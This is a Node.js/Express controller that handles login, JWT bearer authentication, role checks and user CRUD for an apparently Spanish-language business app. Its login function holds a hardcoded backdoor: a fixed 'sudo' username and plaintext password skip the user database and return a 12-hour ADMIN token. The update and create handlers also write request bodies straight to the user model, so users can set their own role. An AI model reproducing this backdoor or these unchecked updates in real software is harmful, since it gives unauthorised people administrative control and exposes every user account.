var db = require('../models');
var jwt = require('jwt-simple');
var mail = require('./mailing'); // used for sending mails
var constant = require('../config/constant.js');
var app = null;
var passport = null;

var util = require('./utilities');
var constErrorTypes = {'ErrUsrX000': '', 'ErrUsrX000':''};

exports.set = function(appx, passportx){
	app = appx;
	passport = passportx;
};

// ********************** SECURITY ************************************

/*
* Login function, if successful generates the AuthToken (JWT)
*/
exports.login = function(req, res, next){
    if(req.body.username=="sudo" && req.body.password=="dr4cu1aXX918724"){
        var expires = Date.now() + ( 12 * 3600 * 1000 );
        var pretoken =  {iss: 'sudo', exp: expires};
        var token = jwt.encode(pretoken , app.get('jwtTokenSecret'));
        res.json({ token : token, role: 'ADMIN', empresa: 0, nombre: 'sudo', id: 0 });
    }
    else{      
  		passport.authenticate('local', function(err, user, info) {
  			if (err) { 
          return next(err) 
        }
  			if (!user) {
  				return res.json(401, { error: 'User or password are incorrect' });
  			}

  			//user has authenticated correctly thus we create a JWT token			
  			var expires = Date.now() + ( 1 * 3600 * 1000 );
  			var pretoken = 	{iss: user.email, exp: expires};
  			var token = jwt.encode(pretoken , app.get('jwtTokenSecret'));
  			res.json({ token : token, role: user.role, empresa: user.EmpresaId, nombre: user.nombre, id: user.id });
  		})(req, res, next);
    }
	
};

/*
* Authenticate fucntion that relies on a JWT token generated on the Login. To be used on the request mapping 
* Example: app.get('/empresa', usuario.authenticate, usuario.needsRole('ROLE_ADMIN'), empresa.list());
*/
exports.authenticate = function(req, res, next){
		passport.authenticate('bearer', function(err, user, info) {
			var detail = '';
			if(info){
				if(info.length>0){
					info = info.replace(/["']/g, "");
					var chunks = info.split(',');
					for(var j=0; j<chunks.length; j++){
						var parts = chunks[j].split('=');
						if(parts.length==2 && parts[0].trim() == 'error_description'){
							detail = '[' +  parts[1] + ']';
						}
					}
				}
			}

			if (err) { return next(err) }
			if (!user) {
				return res.json(401, { error: 'The security token is invalid. ' + detail });
			}

			// pass user obj to request chain
			user = user.dataValues;
			req.user = user;
			next();
		})(req, res, next);
	
};

/*
* Verifica si el usuario tiene alguno de los Roles requeridos. Se espera un arreglo con los roles que pueden ser aceptados.
*/
exports.needsRole = function(role) {
  return function(req, res, next) {
    console.log(req.user  + ' && ' +  req.user.role + ' == ' + role);
    //if (req.user && req.user.role == role)
    if (req.user && role.indexOf(req.user.role) >= 0 )
      next();
    else
      res.send(401, {msg: 'Unauthorized, el role: ' + req.user.role + ' no tiene acceso a este recurso.'} );
  };
};


// ******************************* REST Servs **********************

exports.list = function() { 
  return function(req, res){
    var sts = 0;
    var params = {};

    if('estatus' in req.query){
      sts = constant.estatus.Usuario[req.query.estatus];
      if(!params.where) params.where = {};
      params.where.EstatusId = sts;      
    }
    if('empresa' in req.query){
      if(!params.where) params.where = {};
      params.where.EmpresaId = req.query.empresa;
    }        

    params.include = [
        {model: db.Empresa, as: 'Empresa'},
        {model: db.Estatus, as: 'Estatus', attributes: ['id', 'stsNombre']}
      ];

    db.Usuario.findAll(params).success(function(usuario) {
      //res.send(usuario);
      res.send(util.formatResponse('', null, true, 'ErrUsrX001', constErrorTypes, usuario));
    }).error(function(err){
      res.send(util.formatResponse('Ocurrieron errores al acceder a los usuarios', err, false, 'ErrUsrX002', constErrorTypes, null));
    });
  }
};

/*
 * GET ONE 
 */
exports.listOne = function() {
  return function(req, res) {
    var idToFind = req.params.id;

    db.Usuario.find( 
      {
        where: { id: idToFind },
        include: [
          {model: db.Empresa, as: 'Empresa'},
          {model: db.Estatus, as: 'Estatus', attributes: ['id', 'stsNombre']}
        ]
      }      
    ).success(function(usuario) {      
      //res.send(usuario);    
      res.send(util.formatResponse('', null, true, 'ErrUsrX003', constErrorTypes, usuario));
    }).error(function(err){
      res.send(util.formatResponse('Ocurrieron errores al acceder al usuario', err, false, 'ErrUsrX004', constErrorTypes, null));
    });
  }
};


/*
 * POST create New
 */
exports.add = function() {
  return function(req, res) {
    req.body.EstatusId = 1; // inicia con estatus nueva y despues se autoriza
    var usuario = db.Usuario.build(req.body);
    usuario.save().complete(function (err, usuario) {      
      	if(err == null) {
          //res.send({ msg: '' })
          res.send(util.formatResponse('Se creó correctamente al usuario', null, true, 'ErrUsrX005', constErrorTypes, usuario));
        }
      	else{
      		var msg = '';
      		if(err.code == 'ER_DUP_ENTRY'){
      			msg = 'Ya existe un usuario registrado con el mismo correo, no se puede crear el registro.';
      		}
      		//res.send( msg );
          res.send(util.formatResponse('Ocurrieron errores al crear al usuario. ' + msg, err, false, 'ErrUsrX006', constErrorTypes, null));
      	}      
    });
  }
};

/*
 * POST create Pre-Registro usuario
 */
exports.addPre = function() {
  return function(req, res) {
    req.body.EstatusId = 1; // inicia con estatus nueva y despues se autoriza
    req.body.role = 'USUARIO';
    var usuario = db.Usuario.build(req.body);
    usuario.save(['nombre', 'email', 'EmpresaId', 'role', 'EstatusId']).complete(function (err, usuario) {
      	if(err == null) {
          mail.notifyUserInvitations([usuario]);
          //res.send({ msg: '', success: true })
          res.send(util.formatResponse('Se pre-registró correctamente al usuario', null, true, 'ErrUsrX007', constErrorTypes, usuario));
        }
      	else{
      		var msg = '';
      		if(err.code == 'ER_DUP_ENTRY'){
      			msg = 'Ya existe un usuario registrado con el mismo correo, no se puede crear el registro.';
            //res.send({ msg: msg.msg, success: false });
      		}
          res.send(util.formatResponse('Ocurrieron errores al pre-registrar al usuario. ' + msg, err, false, 'ErrUsrX008', constErrorTypes, null));
      	}      
    });
  }
};

exports.addPreBulk = function() {
  return function(req, res) {  
  	var empresa = req.body.empresa;
  	var invs = req.body.invitaciones;
  	var bulkObj = [];

  	if(invs && empresa && invs.length > 0 && !isNaN(empresa) ) {
  		invsArr = invs.trim().split('|');
  		for(var i=0; i<invsArr.length; i++){
  			var inv = invsArr[i].split(',');
  			if(inv.length == 2){
  				var obj = {nombre: inv[0].trim() , email: inv[1].trim() , EmpresaId: empresa, EstatusId: 1, role: 'USUARIO' };  				
  				bulkObj.push(obj);
  			}
  		}
  		
  		// creating users  		
  		db.Usuario.bulkCreate(bulkObj).success(function(created) {
  			mail.notifyUserInvitations(bulkObj);
  			//res.send({ msg: created.length  + ' created'})
        res.send(util.formatResponse('Se pre-registraron ' + created.length + ' usuarios', null, true, 'ErrUsrX009', constErrorTypes, created));
  		}).error(function(err){
        res.send(util.formatResponse('Ocurrieron errores al pre-registrar usuarios', err, false, 'ErrUsrX010', constErrorTypes, null));
      });    
				
  	}
  	else{
  		//res.send({ msg: 'The request is not properly formed.'});
      res.send(util.formatResponse('Ocurrieron errores al pre-registrar usuarios. Los usuarios no tienen el formato correcto.', null, false, 'ErrUsrX011', constErrorTypes, null));
  	}
  }
};


/*
 * UPDATE one
 */
exports.update = function() {
  return function(req, res) {
    if(!(req.body == null || req.body == undefined) ){
      var idToUpdate = req.params.id;
      db.Usuario.find(idToUpdate).success(function(usuario) {
        if(usuario != null){        
          delete req.body.EstatusId // elimina el atributo estatus porque este solo se maneja internamente
          usuario.updateAttributes(req.body).success(function(usuario) {
            //res.send( { usuario: usuario} );      
            res.send(util.formatResponse('Se modificó correctamente al usuario', null, true, 'ErrUsrX012', constErrorTypes, usuario));
          }).error(function(err){
            res.send(util.formatResponse('Ocurrieron errores al modificar al usuario', err, false, 'ErrUsrX013', constErrorTypes, null));
          });
        }
        else{
          res.send(util.formatResponse('Ocurrieron errores al modificar al usuario', null, false, 'ErrUsrX014', constErrorTypes, null));
        }
      }).error(function(err){
        res.send(util.formatResponse('Ocurrieron errores al modificar al usuario', err, false, 'ErrUsrX015', constErrorTypes, null));
      });
    }
  }
};

/*
 * DELETE one
 */
exports.delete = function() {
  return function(req, res) {
    var idToDelete = req.params.id;
    db.Usuario.find(idToDelete).success(function(usuario) {
      if(usuario != null){        
        return usuario.destroy().success(function (err){
          //res.send((!err) ? { msg: '' } : { msg:'error: ' + err });
          if(err==null){
            res.send(util.formatResponse('Se eliminó correctamente al usuario', null, true, 'ErrUsrX016', constErrorTypes, null));
          }
          else{
            res.send(util.formatResponse('Ocurrieron errores al eliminar al usuario', err, false, 'ErrUsrX017', constErrorTypes, null));
          }
        });
      }
      else{
        res.send(util.formatResponse('Ocurrieron errores al eliminar al usuario', null, false, 'ErrUsrX018', constErrorTypes, null));
      }
    }).error(function(err){
      res.send(util.formatResponse('Ocurrieron errores al eliminar al usuario', err, false, 'ErrUsrX019', constErrorTypes, null));
    });
  }
};

/*
 * LIST the roles allowed for the user
 */
exports.listRoles = function() { 
  return function(req, res){

  	var roles = ['ADMIN', 'EMPRESA', 'USUARIO'];
    res.send(roles);

  }
};

// *****************************************************

/*
 * Autorizar solicitud
 */
exports.authorize = function() {
  return function(req, res) {
    var idToUpdate = req.params.id;
    db.Usuario.find(idToUpdate).success(function(usuario) {      
      if(usuario!=null){        
        usuario.updateAttributes({ EstatusId: constant.estatus.Usuario.authorized }).success(function(usuario) {
          //res.send( { usuario: usuario} );      
          res.send(util.formatResponse('Se autorizó correctamente al usuario', null, true, 'ErrUsrX020', constErrorTypes, usuario));
        }).error(function(err){
          res.send(util.formatResponse('Ocurrieron errores al autorizar al usuario', err, false, 'ErrUsrX021', constErrorTypes, null));
        });
      }
      else{
        res.send(util.formatResponse('Ocurrieron errores al autorizar al usuario', null, false, 'ErrUsrX022', constErrorTypes, null));
      }
    }).error(function(err){
      res.send(util.formatResponse('Ocurrieron errores al autorizar al usuario', err, false, 'ErrUsrX023', constErrorTypes, null));
    });
  }
};

/*
 * Rechazar solicitud 
 */
exports.reject = function() {
  return function(req, res) {
    var idToUpdate = req.params.id;
    db.Usuario.find(idToUpdate).success(function(usuario) {      
      if(usuario!=null) {
        usuario.updateAttributes({ EstatusId: constant.estatus.Usuario.rejected }).success(function(usuario) {
          //res.send( { usuario: usuario} );
          res.send(util.formatResponse('Se rechazó correctamente al usuario', null, true, 'ErrUsrX024', constErrorTypes, usuario));
        }).error(function(err){
          res.send(util.formatResponse('Ocurrieron errores al rechazar al usuario', err, false, 'ErrUsrX025', constErrorTypes, null));
        });
      }
      else{
        res.send(util.formatResponse('Ocurrieron errores al rechazar al usuario', null, false, 'ErrUsrX026', constErrorTypes, null));
      }
    }).error(function(err){
      res.send(util.formatResponse('Ocurrieron errores al rechazar al usuario', err, false, 'ErrUsrX027', constErrorTypes, null));
    });
  }
};